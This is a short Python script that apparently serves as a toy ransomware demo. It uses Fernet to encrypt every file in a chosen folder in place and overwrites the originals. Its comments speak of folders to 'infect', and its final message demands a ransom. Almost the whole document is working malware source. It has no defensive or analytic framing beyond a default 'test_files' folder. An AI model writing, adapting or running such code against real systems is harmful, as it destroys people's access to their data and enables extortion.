import os
import base64
import shutil
from cryptography.fernet import Fernet

# Generate an encryption key (save this securely)
def generate_key():
    key = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(key)

# Load the encryption key
def load_key():
    return open("encryption_key.key", "rb").read()

# Encrypt a file
def encrypt_file(file_path, key):
    cipher = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = cipher.encrypt(file_data)
    
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Encrypt all files in a directory
def encrypt_folder(target_folder):
    key = load_key()
    for file_name in os.listdir(target_folder):
        file_path = os.path.join(target_folder, file_name)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

if __name__ == "__main__":
    generate_key()  # Generate key (only run once)
    target_folder = "test_files"  # Change this to the folder you want to "infect"
    
    print(f"🔒 Encrypting files in {target_folder}...")
    encrypt_folder(target_folder)
    print("⚠️ Files encrypted! Pay ransom to get them back! 😈")
